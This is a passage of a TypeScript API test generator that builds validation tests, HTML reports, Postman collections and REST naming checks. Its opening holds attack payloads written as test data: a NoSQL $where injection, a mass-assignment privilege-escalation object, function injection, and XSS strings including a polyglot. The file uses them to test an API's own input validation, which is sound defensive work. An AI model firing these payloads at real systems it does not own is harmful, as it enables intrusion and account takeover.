                        value: JSON.parse('{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}'),
                        description: 'Deeply nested object DoS attack'
                    },
                    {
                        type: 'Object-NoSQL',
                        value: { "$where": "function() { return true; }" },
                        description: 'NoSQL injection via $where operator'
                    },
                    {
                        type: 'Object-Mass-Assignment',
                        value: { "isAdmin": true, "role": "administrator", "permissions": ["all"] },
                        description: 'Mass assignment attack for privilege escalation'
                    },
                    {
                        type: 'Object-Key-Collision',
                        value: { "toString": "malicious", "valueOf": "payload" },
                        description: 'Object key collision attack'
                    },
                    {
                        type: 'Object-Function-Injection',
                        value: { "eval": "console.log('Code execution')" },
                        description: 'Function injection via object properties'
                    }
                );
                break;

            default:
                // 기본 공격 패턴 (모든 고급 패턴 포함)
                patterns.push(...sqlInjectionPatterns);
                patterns.push(...postgresqlPatterns);
                patterns.push(...mysqlPatterns);
                patterns.push(...mssqlPatterns);
                patterns.push(...oraclePatterns);
                patterns.push(...mongodbPatterns);
                patterns.push(...redisPatterns);
                patterns.push(...linuxCommandPatterns);
                patterns.push(...windowsCommandPatterns);
                patterns.push(...macosCommandPatterns);
                patterns.push(...encodingBypassPatterns);
                patterns.push(...advancedPatterns);
                patterns.push(...binaryPatterns);

                patterns.push(
                    {
                        type: 'XSS-Basic',
                        value: "<script>alert('XSS')</script>",
                        description: 'Basic XSS attack'
                    },
                    {
                        type: 'Generic-Polyglot',
                        value: "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                        description: 'Generic polyglot payload for multiple contexts'
                    }
                );
        }

        return patterns;
    }


    /**
     * 필수 필드 누락 케이스 생성
     */    private static generateMissingFieldCase(
        route: RouteDocumentation,
        location: string,
        fieldName: string
    ): TestCase[] {
        const invalidData = this.generateValidData(route.parameters);
        const { errorCodes, allCodes } = this.extractDefinedStatusCodes(route);

        // HTTP Standard: 422 Unprocessable Entity is the official status code for validation errors
        // Always expect 422 as primary, with route-defined codes as additional acceptable statuses
        const primaryValidationCode = 422;
        const acceptableStatusesSet = new Set([
            primaryValidationCode,
            ...errorCodes.filter(code => code >= 400 && code < 500) // All 4xx error codes from route
        ]);
        const acceptableStatuses = Array.from(acceptableStatusesSet);

        if (invalidData[location] && invalidData[location][fieldName] !== undefined) {
            delete invalidData[location][fieldName];

            const testCase: TestCase = {
                name: `${route.method} ${route.path} - Missing Required ${location}.${fieldName}`,
                description: `Request without required ${location} parameter: ${fieldName}`,
                type: 'failure',
                endpoint: route.path,
                method: route.method,
                data: invalidData,
                expectedStatus: primaryValidationCode,
                validationErrors: [`${fieldName} is required`]
            };

            // Add acceptable statuses if there are route-defined alternatives
            if (acceptableStatuses.length > 1) {
                testCase.acceptableStatuses = acceptableStatuses;
            }

            return [testCase];
        }

        return [];
    }    /**
     * 타입 검증 실패 케이스 생성
     */    private static generateTypeValidationCases(
        route: RouteDocumentation,
        location: string,
        fieldName: string,
        fieldSchema: FieldSchema
    ): TestCase[] {
        const cases: TestCase[] = []; const invalidData = this.generateValidData(route.parameters);
        const { errorCodes, allCodes } = this.extractDefinedStatusCodes(route);

        // HTTP Standard: 422 Unprocessable Entity is the official status code for validation errors
        // Always expect 422 as primary, with route-defined codes as additional acceptable statuses
        const primaryValidationCode = 422;
        const acceptableStatusesSet = new Set([
            primaryValidationCode,
            ...errorCodes.filter(code => code >= 400 && code < 500) // All 4xx error codes from route
        ]);
        const acceptableStatuses = Array.from(acceptableStatusesSet);

        if (!invalidData[location]) return cases;

        let invalidValue: any;
        let shouldGenerateTypeCase = true;

        // For GET/HEAD requests with query parameters, we can't send non-string types
        // since HTTP query parameters are always strings. Instead, generate constraint violations.
        const isQueryParam = location === 'query' && ['GET', 'HEAD'].includes(route.method.toUpperCase());

        switch (fieldSchema.type) {
            case 'string':
            case 'email':
            case 'url':
                if (isQueryParam) {
                    // For query parameters, generate a constraint violation instead
                    if (fieldSchema.min !== undefined && fieldSchema.min > 0) {
                        // Generate a string shorter than minimum length
                        invalidValue = fieldSchema.min === 1 ? '' : 'x'.repeat(fieldSchema.min - 1);
                        shouldGenerateTypeCase = true;
                    } else {
                        // Skip type validation for string query params without constraints
                        shouldGenerateTypeCase = false;
                    }
                } else {
                    invalidValue = 12345; // 숫자를 문자열 대신 사용
                }
                break;
            case 'number':
                invalidValue = 'not-a-number'; // 문자열을 숫자 대신 사용
                break;
            case 'boolean':
                invalidValue = 'not-a-boolean'; // 문자열을 불린 대신 사용
                break;
            case 'array':
                invalidValue = 'not-an-array'; // 문자열을 배열 대신 사용
                break;
            case 'object':
                invalidValue = 'not-an-object'; // 문자열을 객체 대신 사용
                break;
        }

        if (invalidValue !== undefined && shouldGenerateTypeCase) {
            invalidData[location][fieldName] = invalidValue;

            const testName = isQueryParam && (fieldSchema.type === 'string' || fieldSchema.type === 'email' || fieldSchema.type === 'url')
                ? `${route.method} ${route.path} - Below Min Length for ${location}.${fieldName}`
                : `${route.method} ${route.path} - Invalid Type for ${location}.${fieldName}`;

            const description = isQueryParam && (fieldSchema.type === 'string' || fieldSchema.type === 'email' || fieldSchema.type === 'url')
                ? `Request with value below minimum length for ${location} parameter: ${fieldName}`
                : `Request with invalid type for ${location} parameter: ${fieldName}`; const expectedError = isQueryParam && (fieldSchema.type === 'string' || fieldSchema.type === 'email' || fieldSchema.type === 'url')
                    ? `${fieldName} must be at least ${fieldSchema.min} characters/items`
                    : `${fieldName} must be of type ${fieldSchema.type}`;

            const testCase: TestCase = {
                name: testName,
                description: description,
                type: 'failure',
                endpoint: route.path,
                method: route.method,
                data: invalidData,
                expectedStatus: primaryValidationCode,
                validationErrors: [expectedError]
            };

            // Add acceptable statuses if there are route-defined alternatives
            if (acceptableStatuses.length > 1) {
                testCase.acceptableStatuses = acceptableStatuses;
            }

            cases.push(testCase);
        }

        return cases;
    }    /**
     * 범위 검증 실패 케이스 생성
     */    private static generateRangeValidationCases(
        route: RouteDocumentation,
        location: string,
        fieldName: string,
        fieldSchema: FieldSchema
    ): TestCase[] {
        const cases: TestCase[] = [];
        const { errorCodes, allCodes } = this.extractDefinedStatusCodes(route);

        // HTTP Standard: 422 Unprocessable Entity is the official status code for validation errors
        // Always expect 422 as primary, with route-defined codes as additional acceptable statuses
        const primaryValidationCode = 422;
        const acceptableStatusesSet = new Set([
            primaryValidationCode,
            ...errorCodes.filter(code => code >= 400 && code < 500) // All 4xx error codes from route
        ]);
        const acceptableStatuses = Array.from(acceptableStatusesSet);

        // Min 값 검증 실패
        if (fieldSchema.min !== undefined) {
            const invalidData = this.generateValidData(route.parameters);
            let invalidValue: any;

            if (fieldSchema.type === 'string' || fieldSchema.type === 'email' || fieldSchema.type === 'url') {
                invalidValue = fieldSchema.min > 0 ? '' : 'x'.repeat(Math.max(0, fieldSchema.min - 1));
            } else if (fieldSchema.type === 'number') {
                invalidValue = fieldSchema.min - 1;
            } else if (fieldSchema.type === 'array') {
                invalidValue = fieldSchema.min > 0 ? [] : new Array(Math.max(0, fieldSchema.min - 1)).fill('item');
            } if (invalidValue !== undefined && invalidData[location]) {
                invalidData[location][fieldName] = invalidValue;

                const testCase: TestCase = {
                    name: `${route.method} ${route.path} - Below Min for ${location}.${fieldName}`,
                    description: `Request with value below minimum for ${location} parameter: ${fieldName}`,
                    type: 'failure',
                    endpoint: route.path,
                    method: route.method,
                    data: invalidData,
                    expectedStatus: primaryValidationCode,
                    validationErrors: [`${fieldName} must be at least ${fieldSchema.min}`]
                };

                // Add acceptable statuses if there are route-defined alternatives
                if (acceptableStatuses.length > 1) {
                    testCase.acceptableStatuses = acceptableStatuses;
                }

                cases.push(testCase);
            }
        }

        // Max 값 검증 실패
        if (fieldSchema.max !== undefined) {
            const invalidData = this.generateValidData(route.parameters);
            let invalidValue: any;

            if (fieldSchema.type === 'string' || fieldSchema.type === 'email' || fieldSchema.type === 'url') {
                invalidValue = 'x'.repeat(fieldSchema.max + 1);
            } else if (fieldSchema.type === 'number') {
                invalidValue = fieldSchema.max + 1;
            } else if (fieldSchema.type === 'array') {
                invalidValue = new Array(fieldSchema.max + 1).fill('item');
            } if (invalidValue !== undefined && invalidData[location]) {
                invalidData[location][fieldName] = invalidValue;

                const testCase: TestCase = {
                    name: `${route.method} ${route.path} - Above Max for ${location}.${fieldName}`,
                    description: `Request with value above maximum for ${location} parameter: ${fieldName}`,
                    type: 'failure',
                    endpoint: route.path,
                    method: route.method,
                    data: invalidData,
                    expectedStatus: primaryValidationCode,
                    validationErrors: [`${fieldName} must be at most ${fieldSchema.max}`]
                };

                // Add acceptable statuses if there are route-defined alternatives
                if (acceptableStatuses.length > 1) {
                    testCase.acceptableStatuses = acceptableStatuses;
                }

                cases.push(testCase);
            }
        }

        return cases;
    }

    /**
     * 유효한 테스트 데이터 생성
     */
    private static generateValidData(parameters?: {
        query?: Schema;
        params?: Schema;
        body?: Schema;
    }): any {
        const data: any = {};

        if (parameters?.query) {
            data.query = this.generateValidSchemaData(parameters.query);
        }

        if (parameters?.params) {
            data.params = this.generateValidSchemaData(parameters.params);
        }

        if (parameters?.body) {
            data.body = this.generateValidSchemaData(parameters.body);
        }

        return data;
    }

    /**
     * 스키마에 기반한 유효한 데이터 생성
     */
    private static generateValidSchemaData(schema: Schema): any {
        const data: any = {};

        for (const [fieldName, fieldSchema] of Object.entries(schema)) {
            // Required 필드만 생성 (선택적 필드는 랜덤으로 포함)
            if (fieldSchema.required || Math.random() > 0.5) {
                data[fieldName] = this.generateValidFieldValue(fieldSchema);
            }
        }

        return data;
    }

    /**
     * 필드 스키마에 기반한 유효한 값 생성
     */
    private static generateValidFieldValue(fieldSchema: FieldSchema): any {
        switch (fieldSchema.type) {
            case 'string':
                const minLength = fieldSchema.min || 1;
                const maxLength = fieldSchema.max || 50;
                const length = Math.max(minLength, Math.min(maxLength, 10));
                return 'test'.repeat(Math.ceil(length / 4)).substring(0, length);

            case 'email':
                return 'test@example.com';

            case 'url':
                return 'https://example.com';

            case 'number':
                const min = fieldSchema.min || 0;
                const max = fieldSchema.max || 100;
                return Math.floor(Math.random() * (max - min + 1)) + min;

            case 'boolean':
                return Math.random() > 0.5;

            case 'array':
                const arrayMin = fieldSchema.min || 0;
                const arrayMax = fieldSchema.max || 5;
                const arrayLength = Math.max(arrayMin, Math.min(arrayMax, 3));
                return Array.from({ length: arrayLength }, (_, i) => `item${i + 1}`);

            case 'object':
                return { key: 'value', timestamp: new Date().toISOString() }; default:
                return 'test-value';
        }
    }

    /**
     * 응답 스키마에 기반한 예상 응답 데이터 생성
     */
    private static generateExpectedResponseData(responseSchema: Schema, inputData?: any): any {
        // For schema validation mode
        if (Object.keys(responseSchema).every(key => typeof responseSchema[key] === 'string')) {
            return {
                mode: 'schema',
                schema: responseSchema
            };
        }

        // Generate sample response data with partial matching for dynamic fields
        const expectedData: any = {};

        for (const [fieldName, fieldSchema] of Object.entries(responseSchema)) {
            if (fieldSchema.required) {
                // For required fields, generate expected values
                if (fieldName === 'id') {
                    // ID fields should exist but value can vary
                    expectedData[fieldName] = { type: 'number', required: true };
                } else if (fieldName === 'createdAt' || fieldName === 'updatedAt' || fieldName === 'timestamp') {
                    // Timestamp fields should exist but value can vary
                    expectedData[fieldName] = { type: 'string', required: true, pattern: 'ISO8601' };
                } else if (fieldName === 'message' && inputData?.query?.name) {
                    // Message fields often have predictable content
                    expectedData[fieldName] = `Hello ${inputData.query.name}!`;
                } else if (fieldName === 'name' && inputData?.body?.name) {
                    // Echo back input data
                    expectedData[fieldName] = inputData.body.name;
                } else if (fieldName === 'email' && inputData?.body?.email) {
                    // Echo back input data
                    expectedData[fieldName] = inputData.body.email;
                } else {
                    // Generate sample value for other required fields
                    expectedData[fieldName] = this.generateValidFieldValue(fieldSchema);
                }
            }
        }

        // Return as partial match mode for flexible validation
        return {
            mode: 'partial',
            value: expectedData
        };
    }

    /**
     * 라우트를 경로별로 그룹화
     */
    private static groupRoutesByPath(testSuites: RouteTestSuite[]): RouteGroup[] {
        const groups = new Map<string, RouteTestSuite[]>();

        for (const suite of testSuites) {
            const pathParts = suite.route.path.split('/').filter(part => part && !part.startsWith(':'));
            const basePath = pathParts.length > 0 ? `/${pathParts[0]}` : '/';

            if (!groups.has(basePath)) {
                groups.set(basePath, []);
            }
            groups.get(basePath)!.push(suite);
        }

        return Array.from(groups.entries()).map(([path, routes], index) => ({
            id: `group-${index}`,
            path,
            routes,
            totalTests: routes.reduce((sum, route) => sum + route.testCases.length, 0)
        }));
    }    /**
     * 통계 정보 생성
     */    private static generateStats(testSuites: RouteTestSuite[]): TestReportStats {
        // 전체 철학 검증 수행
        const philosophyResult = this.validateDevelopmentPhilosophy();

        return {
            totalRoutes: testSuites.length,
            totalTests: testSuites.reduce((sum, suite) => sum + suite.testCases.length, 0),
            successTests: testSuites.reduce((sum, suite) =>
                sum + suite.testCases.filter(tc => tc.type === 'success').length, 0),
            failureTests: testSuites.reduce((sum, suite) =>
                sum + suite.testCases.filter(tc => tc.type === 'failure').length, 0),
            securityTests: testSuites.reduce((sum, suite) =>
                sum + suite.testCases.filter(tc =>
                    tc.name.includes('Security Attack')).length, 0),
            philosophyTests: testSuites.reduce((sum, suite) =>
                sum + suite.testCases.filter(tc =>
                    tc.securityTestType && tc.securityTestType.includes('philosophy')).length, 0),
            philosophyScore: philosophyResult.score,
            philosophyViolations: philosophyResult.violations
        };
    }

    /**
     * EJS 템플릿을 사용한 HTML 테스트 리포트 생성
     */
    static async generateTestReport(): Promise<string> {
        if (!this.isTestingEnabled()) {
            return '<h1>Testing is not enabled</h1><p>Set NODE_ENV=development and AUTO_DOCS=true to enable testing.</p>';
        }

        try {
            const testSuites = this.generateAllTestCases();
            const routeGroups = this.groupRoutesByPath(testSuites);
            const stats = this.generateStats(testSuites);

            const templatePath = path.join(this.viewsPath, 'test-report.ejs');

            const html = await ejs.renderFile(templatePath, {
                stats,
                routeGroups,
                testSuites
            }, {
                views: [this.viewsPath]
            });

            return html;
        } catch (error: any) {
            log.error('Failed to generate test report', { error: error.message });
            return `
                <h1>Error generating test report</h1>
                <p>Error: ${error.message}</p>
                <p>Make sure the views directory exists at: ${this.viewsPath}</p>
            `;
        }
    }

    /**
     * 동기적 HTML 테스트 리포트 생성 (fallback)
     */
    static generateTestReportSync(): string {
        if (!this.isTestingEnabled()) {
            return '<h1>Testing is not enabled</h1><p>Set NODE_ENV=development and AUTO_DOCS=true to enable testing.</p>';
        }

        const testSuites = this.generateAllTestCases();
        const routeGroups = this.groupRoutesByPath(testSuites);
        const stats = this.generateStats(testSuites);

        // Simple HTML template as fallback
        return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Test Report</title>
    <link rel="stylesheet" href="/test-styles.css">
    <link rel="stylesheet" href="/summary-styles.css">
    <script src="/test-scripts-optimized.js"></script>
    <script src="/test-fixes.js"></script>
    <script src="/progress-fix.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🧪 API Test Report</h1>
            <p>Automated test cases for API routes</p>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number routes">${stats.totalRoutes}</div>
                    <div class="stat-label">Routes</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number total">${stats.totalTests}</div>
                    <div class="stat-label">Total Tests</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number success">${stats.successTests}</div>
                    <div class="stat-label">Success Cases</div>
                </div>                <div class="stat-card">
                    <div class="stat-number failure">${stats.failureTests}</div>
                    <div class="stat-label">Failure Cases</div>
                </div>                <div class="stat-card">
                    <div class="stat-number security" style="color: #FF5722;">${stats.securityTests}</div>
                    <div class="stat-label">Security Tests</div>
                </div>
            </div>
        </div>

        <div class="controls">
            <div class="search-container">
                <input type="text" class="search-input" id="searchInput" placeholder="🔍 Search test cases...">
            </div>            <div class="filter-container">
                <button class="filter-btn active" data-filter="all">All</button>
                <button class="filter-btn" data-filter="success">Success</button>
                <button class="filter-btn" data-filter="failure">Failure</button>
                <button class="filter-btn" data-filter="security">Security</button>
            </div>
        </div>
        
        <div class="bulk-actions">
            <button class="bulk-btn expand-all" onclick="expandAll()">Expand All</button>
            <button class="bulk-btn collapse-all" onclick="collapseAll()">Collapse All</button>
            <button class="bulk-btn run-all" onclick="runAllTests()">Run All Tests</button>
        </div>
        
        <div id="testResults">
            ${this.generateRouteGroupsHTML(routeGroups)}
        </div>
        
        <div id="noResults" class="no-results" style="display: none;">
            <h3>No test cases found</h3>
            <p>Try adjusting your search or filter criteria</p>
        </div>    
        </div>
</body>
</html>`;
    }

    /**
     * 라우트 그룹 HTML 생성 (fallback용)
     */
    private static generateRouteGroupsHTML(routeGroups: RouteGroup[]): string {
        return routeGroups.map(group => `
            <div class="route-group" data-path="${group.path}">
                <div class="route-group-header" onclick="toggleGroup('${group.id}')">
                    <div class="route-group-title">
                        <span class="path-icon">📁</span>
                        ${group.path || 'Root Path'}
                    </div>
                    <div class="route-group-stats">
                        <span class="route-count">${group.routes.length} routes</span>
                        <span class="test-count">${group.totalTests} tests</span>
                        <span class="collapse-icon">▼</span>
                    </div>
                </div>
                
                <div class="route-group-content" id="${group.id}">
                    ${group.routes.map(testSuite => this.generateTestSuiteHTML(testSuite)).join('')}
                </div>
            </div>
        `).join('');
    }

    /**
     * 테스트 스위트 HTML 생성 (fallback용)
     */
    private static generateTestSuiteHTML(testSuite: RouteTestSuite): string {
        const suiteId = `${testSuite.route.method}-${testSuite.route.path.replace(/[^a-zA-Z0-9]/g, '-')}`;

        return `
            <div class="test-suite" data-method="${testSuite.route.method}" data-path="${testSuite.route.path}">
                <div class="suite-header" onclick="toggleSuite('${suiteId}')">
                    <div class="suite-title">
                        <div class="route-info">
                            <span class="method-badge ${testSuite.route.method}">${testSuite.route.method}</span>
                            <span class="route-path">${testSuite.route.path}</span>
                            ${testSuite.route.summary ? `<span class="route-summary"> - ${testSuite.route.summary}</span>` : ''}
                        </div>
                        <div class="suite-stats">
                            <span class="test-count">${testSuite.testCases.length} tests</span>
                            <span class="collapse-icon">▼</span>
                        </div>
                    </div>
                </div>
                
                <div class="suite-content" id="suite-${suiteId}">
                    ${testSuite.testCases.map((testCase, index) =>
            this.generateTestCaseHTML(testCase, index, suiteId)).join('')}
                </div>
            </div>
        `;
    }    /**
     * 테스트 케이스 HTML 생성 (fallback용)
     */    private static generateTestCaseHTML(testCase: TestCase, index: number, suiteId: string): string {
        // 안전한 HTML 이스케이핑을 위해 escapeJsonForHtml 사용
        const testDataJson = testCase.data ? this.escapeJsonForHtml(testCase.data) : '';
        const testDataStr = testCase.data ? encodeURIComponent(JSON.stringify(testCase.data)) : encodeURIComponent('{}');

        return `            
            <div class="test-case ${this.escapeHtml(testCase.type)} ${testCase.securityTestType ? 'security' : ''}" 
                 data-type="${this.escapeHtml(testCase.type)}" 
                 data-method="${this.escapeHtml(testCase.method)}" 
                 data-endpoint="${this.escapeHtml(testCase.endpoint)}"
                 ${testCase.securityTestType ? `data-security-type="${this.escapeHtml(testCase.securityTestType)}"` : ''}>
                
                <div class="test-info">
                    <div class="test-name">${this.escapeHtml(testCase.name)}</div>
                    <div class="test-description">${this.escapeHtml(testCase.description)}</div>
                    <div class="test-details">
                        Expected Status: <strong>${this.escapeHtml(String(testCase.expectedStatus))}</strong>
                        ${testCase.expectedErrors && testCase.expectedErrors.length > 0 ?
                `| Expected Errors: <strong>${testCase.expectedErrors.map(e => this.escapeHtml(e)).join(', ')}</strong>` : ''}
                    </div>
                    
                    ${testCase.data && Object.keys(testCase.data).length > 0 ? `
                        <div class="test-data" onclick="toggleTestData('${this.escapeHtml(suiteId)}-${index}')">
                            <div class="data-header">
                                📋 Test Data <span class="expand-icon">▼</span>
                                <button class="copy-btn" onclick="event.stopPropagation(); copyTestData('${testDataStr}')">
                                    Copy
                                </button>
                            </div>
                            <div class="data-content" id="data-${this.escapeHtml(suiteId)}-${index}" style="display: none;">
                                <pre>${testDataJson}</pre>
                            </div>
                        </div>
                        ` : ''}
                </div>
                  <div class="test-actions">
                    <span class="test-badge ${this.escapeHtml(testCase.type)}">${this.escapeHtml(testCase.type)}</span>
                    <button class="run-test-btn" 
                            data-method="${this.escapeHtml(testCase.method)}"
                            data-endpoint="${this.escapeHtml(testCase.endpoint)}"
                            data-test-data="${testDataStr}"
                            data-expected-status="${this.escapeHtml(String(testCase.expectedStatus))}"
                            ${testCase.acceptableStatuses ? `data-acceptable-statuses='${this.escapeHtml(JSON.stringify(testCase.acceptableStatuses))}'` : ''}
                            data-expected-data="${testCase.expectedData ? encodeURIComponent(JSON.stringify(testCase.expectedData)) : 'null'}"
                            data-result-id="result-${this.escapeHtml(suiteId)}-${index}"
                            onclick="runTestFromButton(this)">
                        Run Test
                    </button>
                </div>
                
                <div id="result-${this.escapeHtml(suiteId)}-${index}" class="test-result" style="display: none;"></div>
            </div>
        `;
    }

    /**
     * 테스트 케이스 JSON 반환
     */
    static generateTestCasesJSON(): any {
        if (!this.isTestingEnabled()) {
            return { error: 'Testing is not enabled' };
        }

        try {
            const testSuites = this.generateAllTestCases();
            const stats = this.generateStats(testSuites);

            return {
                metadata: {
                    generatedAt: new Date().toISOString(),
                    totalRoutes: stats.totalRoutes,
                    totalTests: stats.totalTests,
                    successTests: stats.successTests,
                    failureTests: stats.failureTests,
                    securityTests: stats.securityTests
                },
                testSuites: testSuites.map(suite => ({
                    route: {
                        method: suite.route.method,
                        path: suite.route.path,
                        summary: suite.route.summary,
                        description: suite.route.description,
                        tags: suite.route.tags
                    },
                    testCases: suite.testCases
                }))
            };
        } catch (error: any) {
            log.error('Failed to generate test cases JSON', { error: error.message });
            return { error: 'Failed to generate test cases JSON', details: error.message };
        }
    }

    /**
     * Postman Collection 생성
     */
    static generatePostmanCollection(): any {
        if (!this.isTestingEnabled()) {
            return { error: 'Testing is not enabled' };
        }

        try {
            const testSuites = this.generateAllTestCases();
            const baseUrl = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;

            const collection = {
                info: {
                    name: 'Express Kusto API Test Collection',
                    description: 'Auto-generated test collection for API routes',
                    schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json'
                },
                variable: [
                    {
                        key: 'baseUrl',
                        value: baseUrl,
                        type: 'string'
                    }
                ],
                item: [] as any[]
            };

            for (const testSuite of testSuites) {
                const folder = {
                    name: `${testSuite.route.method.toUpperCase()} ${testSuite.route.path}`,
                    description: testSuite.route.description || testSuite.route.summary,
                    item: [] as any[]
                };

                for (const testCase of testSuite.testCases) {
                    const request: any = {
                        name: testCase.name,
                        request: {
                            method: testCase.method.toUpperCase(),
                            header: [
                                {
                                    key: 'Content-Type',
                                    value: 'application/json'
                                }
                            ],
                            url: {
                                raw: `{{baseUrl}}${testCase.endpoint}`,
                                host: ['{{baseUrl}}'],
                                path: testCase.endpoint.split('/').filter(p => p)
                            }
                        },
                        response: []
                    };

                    // Add query parameters
                    if (testCase.data?.query) {
                        request.request.url.query = Object.entries(testCase.data.query).map(([key, value]) => ({
                            key,
                            value: String(value),
                            disabled: false
                        }));
                    }

                    // Add body data
                    if (testCase.data?.body && ['POST', 'PUT', 'PATCH'].includes(testCase.method.toUpperCase())) {
                        request.request.body = {
                            mode: 'raw',
                            raw: JSON.stringify(testCase.data.body, null, 2),
                            options: {
                                raw: {
                                    language: 'json'
                                }
                            }
                        };
                    }                    // Add test script with additional test for security cases
                    const execScript = [
                        `// ${testCase.description}`,
                        `pm.test("Status code is ${testCase.expectedStatus}", function () {`,
                        `    pm.response.to.have.status(${testCase.expectedStatus});`,
                        `});`,
                        '',
                        'pm.test("Response time is less than 2000ms", function () {',
                        '    pm.expect(pm.response.responseTime).to.be.below(2000);',
                        '});',
                        '',
                        'pm.test("Response has JSON body", function () {',
                        '    pm.response.to.be.json;',
                        '});'
                    ];                    // Add additional tests for security test cases
                    if (testCase.securityTestType) {
                        execScript.push(
                            '',
                            `// Additional security test: ${testCase.securityTestType}`,
                            'pm.test("Response should contain validation errors", function () {',
                            '    const jsonData = pm.response.json();',
                            '    pm.expect(jsonData.errors).to.exist;',
                            '    const errorsExist = Array.isArray(jsonData.errors) && jsonData.errors.length > 0;',
                            '    pm.expect(errorsExist).to.be.true;',
                            '});'
                        );
                    }

                    request.event = [{
                        listen: 'test',
                        script: {
                            type: 'text/javascript',
                            exec: execScript
                        }
                    }];

                    folder.item.push(request);
                }

                collection.item.push(folder);
            }

            return collection;
        } catch (error: any) {
            log.error('Failed to generate Postman collection', { error: error.message });
            return { error: 'Failed to generate Postman collection', details: error.message };
        }
    }



    /**
     * CMS 개발 철학 검증
     */
    static validateDevelopmentPhilosophy(): PhilosophyValidationResult {
        if (!this.isTestingEnabled()) {
            return {
                violations: [],
                isValid: true,
                score: 100
            };
        }

        this.routes = DocumentationGenerator.getRoutes();
        const violations: PhilosophyViolation[] = [];

        for (const route of this.routes) {
            // 1. 기본 라우트 경로 네이밍 검증
            violations.push(...this.validateRouteNaming(route));

            // 2. 고급 라우트 네이밍 검증
            violations.push(...this.validateEnhancedRouteNaming(route));

            // 3. RESTful API 스펙 검증 (고급 버전 사용)
            violations.push(...this.validateEnhancedRESTfulSpecs(route));

            // 4. HTTP 스펙 검증 (고급 버전 사용)
            violations.push(...this.validateEnhancedHTTPSpecs(route));

            // 5. 보안 철학 검증
            violations.push(...this.validateSecurityPhilosophy(route));

            // 6. 성능 최적화 철학 검증
            violations.push(...this.validatePerformancePhilosophy(route));

            // 7. API 일관성 철학 검증
            violations.push(...this.validateConsistencyPhilosophy(route));
        }

        const score = this.calculatePhilosophyScore(violations);
        const isValid = violations.filter(v => v.severity === 'error').length === 0;

        return {
            violations,
            isValid,
            score
        };
    }

    /**
     * 고급 개발 철학 검증 시스템
     * 기존 기본 검증에 추가로 보안, 성능, 일관성 검증을 포함
     */
    static validateEnhancedDevelopmentPhilosophy(): PhilosophyValidationResult {
        if (!this.isTestingEnabled()) {
            return {
                violations: [],
                isValid: true,
                score: 100
            };
        }

        this.routes = DocumentationGenerator.getRoutes();
        const violations: PhilosophyViolation[] = [];

        for (const route of this.routes) {
            // 1. 기본 라우트 경로 네이밍 검증
            violations.push(...this.validateEnhancedRouteNaming(route));

            // 2. RESTful API 스펙 검증
            violations.push(...this.validateEnhancedRESTfulSpecs(route));

            // 3. HTTP 스펙 검증
            violations.push(...this.validateEnhancedHTTPSpecs(route));

            // 4. 보안 철학 검증
            violations.push(...this.validateSecurityPhilosophy(route));

            // 5. 성능 최적화 철학 검증
            violations.push(...this.validatePerformancePhilosophy(route));

            // 6. API 일관성 철학 검증
            violations.push(...this.validateConsistencyPhilosophy(route));
        }

        const score = this.calculateEnhancedPhilosophyScore(violations);
        const isValid = violations.filter(v => v.severity === 'error').length === 0;

        return {
            violations,
            isValid,
            score
        };
    }

    /**
     * 향상된 라우트 네이밍 검증
     */
    private static validateEnhancedRouteNaming(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];
        const pathSegments = route.path.split('/').filter(segment => segment && !segment.startsWith(':'));

        // 1. 대문자 검증
        for (const segment of pathSegments) {
            if (/[A-Z]/.test(segment)) {
                violations.push({
                    type: 'naming',
                    severity: 'error',
                    message: `라우트 경로에 대문자가 포함되어 있습니다: '${segment}'`,
                    suggestion: `'${segment.toLowerCase()}'로 변경하세요`,
                    route: route.path,
                    method: route.method,
                    ruleId: 'NAM-001',
                    category: 'route-naming',
                    examples: [`/${segment.toLowerCase()}`, '/users', '/products'],
                    links: ['https://restfulapi.net/resource-naming/']
                });
            }
        }

        // 2. 단일 단어 규칙 검증
        for (const segment of pathSegments) {
            if (segment.includes('-') || segment.includes('_')) {
                const words = segment.split(/[-_]/);
                if (words.length > 2) {
                    violations.push({
                        type: 'naming',
                        severity: 'warning',
                        message: `라우트 세그먼트가 너무 복잡합니다: '${segment}'`,
                        suggestion: `더 간단한 단일 단어로 변경하거나 리소스 구조를 재검토하세요`,
                        route: route.path,
                        method: route.method,
                        ruleId: 'NAM-002',
                        category: 'route-naming',
                        examples: ['users', 'posts', 'simple-name'],
                        links: ['https://restfulapi.net/resource-naming/']
                    });
                }
            }
        }

        // 3. RESTful 명사 검증 (동사 패턴 동적 감지)
        for (const segment of pathSegments) {
            const isLikelyVerb = this.detectVerbPattern(segment);
            if (isLikelyVerb) {
                violations.push({
                    type: 'naming',
                    severity: 'error',
                    message: `라우트 경로에 동사 패턴 '${segment}'를 사용하면 안됩니다`,
                    suggestion: 'HTTP 메서드를 사용하여 동작을 표현하고, 경로에는 명사만 사용하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'NAM-003',
                    category: 'route-naming',
                    examples: ['GET /users (not GET /getUsers)', 'POST /users (not POST /createUser)']
                });
            }
        }

        return violations;
    }

    /**
     * 향상된 RESTful API 스펙 검증
     */
    private static validateEnhancedRESTfulSpecs(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];
        const pathSegments = route.path.split('/').filter(segment => segment);
        const hasIdParam = pathSegments.some(segment => segment.startsWith(':'));
        const method = route.method.toUpperCase();

        // 1. GET 요청 검증
        if (method === 'GET') {
            if (hasIdParam && !route.path.endsWith('/:id') && !route.path.includes('/:id/')) {
                violations.push({
                    type: 'restful',
                    severity: 'warning',
                    message: 'GET 요청에서 ID 파라미터는 일반적으로 /:id 형식을 사용합니다',
                    suggestion: '리소스 식별자를 /:id 형식으로 변경하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'REST-001',
                    category: 'rest-compliance',
